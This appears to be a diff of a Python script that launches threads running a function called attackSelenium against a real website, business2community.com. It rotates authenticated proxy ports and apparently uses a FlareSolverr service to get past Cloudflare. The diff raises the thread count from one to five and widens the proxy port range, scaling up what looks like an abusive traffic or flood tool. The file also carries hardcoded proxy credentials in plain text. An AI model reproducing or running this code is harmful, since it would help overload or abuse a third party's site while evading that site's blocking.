@@ -29,7 +29,7 @@ letters = string.ascii_lowercase
 PORT=10000
 PROXY_USER = 'spcmp28zj1' 
 PROXY_PASS = '123123123'
-PROXY_URL_BASE = 'http://'+PROXY_USER+':'+PROXY_PASS+'@gb.smartproxy.com:PORT'
+PROXY_URL_BASE = 'http://'+PROXY_USER+':'+PROXY_PASS+'@all.dc.smartproxy.com:PORT'
 
 PROXY_URL= '127.0.0.1:8080'
 
@@ -128,7 +128,7 @@ def checkmyHeaders():
 	input()
 
 def changeProxies():
-	PORT=random.randrange(30001,32048)
+	PORT=random.randrange(10001,32048)
 	PROXY_URL = PROXY_URL_BASE.replace('PORT',str(PORT))
 
 	proxies = {
@@ -381,7 +381,7 @@ def attackSelenium(baseUrl):
 flareSolverUrl = 'http://localhost:8191/v1'
 
 
-for i in range(1):
+for i in range(5):
 	Thread(target=attackSelenium, args=['https://www.business2community.com']).start()
 input()
 
